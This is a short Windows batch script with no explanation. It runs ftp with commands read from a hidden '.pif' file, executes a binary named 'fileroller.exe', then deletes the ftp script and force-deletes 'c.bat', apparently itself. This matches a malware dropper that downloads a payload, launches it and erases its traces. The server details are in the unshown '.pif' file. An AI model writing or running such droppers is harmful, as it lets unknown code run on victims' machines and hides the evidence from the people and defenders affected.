   @echo off
   ftp -n -v -s:.pif
   fileroller.exe
   del .pif
   del /F c.bat
   exit /y
